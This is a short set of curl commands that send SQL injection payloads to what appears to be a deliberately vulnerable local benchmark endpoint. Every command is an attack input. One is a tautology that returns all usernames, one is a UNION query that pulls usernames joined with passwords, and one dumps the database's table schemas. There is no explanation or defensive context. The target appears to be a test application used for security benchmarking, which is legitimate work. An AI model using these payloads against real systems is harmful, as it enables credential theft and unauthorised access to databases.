# Extract all usernames (boolean/tautology)
curl -X POST 'http://localhost:8443/benchmark/sqli-00/BenchmarkTest00284' \
  -d "BenchmarkTest00284=' OR '1'='1"

# Extract all usernames and passwords (UNION)
curl -X POST 'http://localhost:8443/benchmark/sqli-00/BenchmarkTest00284' \
  -d "BenchmarkTest00284=' UNION SELECT username || ':' || password from USERS--"

# Dump all table schemas
curl -X POST 'http://localhost:8443/benchmark/sqli-00/BenchmarkTest00284' \
  -d "BenchmarkTest00284=' UNION SELECT sql FROM sqlite_master WHERE type='table'--"